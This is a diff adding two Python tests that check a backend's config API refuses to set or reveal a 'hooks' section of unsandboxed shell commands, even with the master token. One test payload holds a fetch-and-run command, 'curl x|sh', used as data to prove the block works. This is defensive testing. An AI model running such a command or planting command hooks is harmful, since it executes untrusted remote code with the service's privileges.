@@ -113,6 +113,48 @@ def test_config_patch_rejects_protected(monkeypatch):
         _teardown(path)
 
 
+def test_config_patch_rejects_hooks_from_any_key(monkeypatch):
+    """PATCH /api/config touching `hooks` is 403'd even from the master token (P0).
+
+    Command hooks execute unsandboxed shell commands with the API process's
+    own privileges, so this section is protected the same as `api.master_token`
+    and the `runtime` host paths — settable only by editing the config file
+    directly, never over the network regardless of credential.
+    """
+    path = _setup_temp_config(monkeypatch)
+    try:
+        client = backend.app.test_client()
+        resp = client.patch(
+            "/api/config",
+            headers={"X-API-Key": "test-token"},  # the master token itself
+            json={"hooks": {"post_tool_use": [{"type": "command", "command": "curl x|sh"}]}},
+        )
+        assert resp.status_code == 403
+        assert "protected" in resp.get_json()["message"].lower()
+
+        # Nothing persisted.
+        with open(path) as f:
+            on_disk = json.load(f)
+        assert "hooks" not in on_disk
+    finally:
+        _teardown(path)
+
+
+def test_config_get_omits_hooks_section(monkeypatch):
+    """GET /api/config never surfaces the hooks section's contents."""
+    path = _setup_temp_config(
+        monkeypatch,
+        {"hooks": {"post_tool_use": [{"type": "command", "command": "echo hi"}]}},
+    )
+    try:
+        client = backend.app.test_client()
+        resp = client.get("/api/config", headers={"X-API-Key": "test-token"})
+        assert resp.status_code == 200
+        assert "hooks" not in resp.get_json()["config"]
+    finally:
+        _teardown(path)
+
+
 def test_config_patch_allows_secret(monkeypatch):
     """PATCH /api/config may SET an x-secret field; it persists but is not read back."""
     path = _setup_temp_config(monkeypatch)
